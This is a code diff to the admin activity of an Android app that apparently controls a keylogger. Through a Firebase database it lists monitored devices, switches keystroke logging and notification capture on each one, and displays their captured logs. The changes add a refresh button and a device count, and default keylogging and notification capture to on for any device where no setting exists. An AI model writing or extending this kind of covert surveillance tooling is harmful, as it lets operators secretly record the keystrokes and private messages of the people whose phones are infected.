@@ -7,6 +7,7 @@ import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
 import android.widget.TextView
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
@@ -22,6 +23,7 @@ import java.util.Locale
 class AdminMainActivity : AppCompatActivity() {
 
     private lateinit var recyclerView: RecyclerView
+    private lateinit var txtTotalDevices: TextView
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
@@ -42,6 +44,13 @@ class AdminMainActivity : AppCompatActivity() {
         }
         setContentView(R.layout.activity_admin_main)
 
+        txtTotalDevices = findViewById(R.id.txtTotalDevices)
+        val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
+        btnRefresh.setOnClickListener {
+            loadConnectedDevices()
+            Toast.makeText(this, "Devices synced successfully!", Toast.LENGTH_SHORT).show()
+        }
+
         recyclerView = findViewById(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
@@ -49,9 +58,11 @@ class AdminMainActivity : AppCompatActivity() {
             if (type == "key") {
                 device.keylogging = newState
                 ref.child("keylogging").setValue(newState)
+                ref.child("status").child("keylogging").setValue(newState)
             } else {
                 device.notifications = newState
                 ref.child("notifications").setValue(newState)
+                ref.child("status").child("notifications").setValue(newState)
             }
             adapter.notifyDataSetChanged()
         }
@@ -73,6 +84,7 @@ class AdminMainActivity : AppCompatActivity() {
                         listenToDeviceLogs(deviceName)
                     }
                 }
+                txtTotalDevices.text = deviceList.size.toString()
                 adapter.notifyDataSetChanged()
             }
 
@@ -82,16 +94,26 @@ class AdminMainActivity : AppCompatActivity() {
 
     private fun listenToDeviceState(deviceName: String) {
         val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
+        
+        cmdRef.child("keylogging").get().addOnSuccessListener { 
+            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
+        }
+        cmdRef.child("notifications").get().addOnSuccessListener { 
+            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
+        }
+
         cmdRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val keyObj = snapshot.child("keylogging").value
+                val keyObj = snapshot.child("status").child("keylogging").value
+                    ?: snapshot.child("keylogging").value
                 val key = when (keyObj) {
                     is Boolean -> keyObj
                     is String -> keyObj.toBoolean()
                     else -> true
                 }
 
-                val notifObj = snapshot.child("notifications").value
+                val notifObj = snapshot.child("status").child("notifications").value
+                    ?: snapshot.child("notifications").value
                 val notif = when (notifObj) {
                     is Boolean -> notifObj
                     is String -> notifObj.toBoolean()
@@ -135,7 +157,7 @@ class AdminMainActivity : AppCompatActivity() {
                 }
                 val index = deviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent logs."
+                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent activity."
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -163,7 +185,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = "📱 Device: ${device.name}"
+            holder.txtName.text = device.name
 
             if (device.keylogging) {
                 holder.btnKey.text = "Key Logger: ON"
